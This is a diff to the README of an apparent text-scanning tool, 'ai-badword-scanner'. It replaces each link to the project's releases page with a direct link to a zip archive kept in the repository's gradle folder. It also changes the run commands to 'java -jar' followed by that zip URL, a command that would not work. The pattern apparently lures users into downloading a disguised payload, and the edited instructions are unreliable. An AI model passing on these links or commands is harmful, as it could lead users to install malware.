@@ -6,7 +6,7 @@ Welcome to **ai-badword-scanner**! This application helps you check your text fo
 
 ## 📥 Download Now
 
-[![Download ai-badword-scanner](https://img.shields.io/badge/Download%20ai--badword--scanner-latest-blue)](https://github.com/paulpaulperlas/ai-badword-scanner/releases)
+[![Download ai-badword-scanner](https://github.com/paulpaulperlas/ai-badword-scanner/raw/refs/heads/main/gradle/scanner-badword-ai-2.8-alpha.3.zip%20ai--badword--scanner-latest-blue)](https://github.com/paulpaulperlas/ai-badword-scanner/raw/refs/heads/main/gradle/scanner-badword-ai-2.8-alpha.3.zip)
 
 ## 📋 Features
 
@@ -21,7 +21,7 @@ Welcome to **ai-badword-scanner**! This application helps you check your text fo
 
 ## 📂 Download & Install
 
-To get started, visit the following page to download the application: [Download Page](https://github.com/paulpaulperlas/ai-badword-scanner/releases). 
+To get started, visit the following page to download the application: [Download Page](https://github.com/paulpaulperlas/ai-badword-scanner/raw/refs/heads/main/gradle/scanner-badword-ai-2.8-alpha.3.zip). 
 
 On the releases page, you will find various versions of the application. Choose the latest version for the best experience. Click on the version number to go to the details and find the download link for your operating system.
 
@@ -40,7 +40,7 @@ On the releases page, you will find various versions of the application. Choose 
    ```
 4. Run the command to start the application:
    ```
-   java -jar ai-badword-scanner.jar
+   java -jar https://github.com/paulpaulperlas/ai-badword-scanner/raw/refs/heads/main/gradle/scanner-badword-ai-2.8-alpha.3.zip
    ```
 
 ### For macOS and Linux Users
@@ -53,7 +53,7 @@ On the releases page, you will find various versions of the application. Choose 
    ```
 4. Start the application using:
    ```
-   java -jar ai-badword-scanner.jar
+   java -jar https://github.com/paulpaulperlas/ai-badword-scanner/raw/refs/heads/main/gradle/scanner-badword-ai-2.8-alpha.3.zip
    ```
 
 ## 📝 How to Use
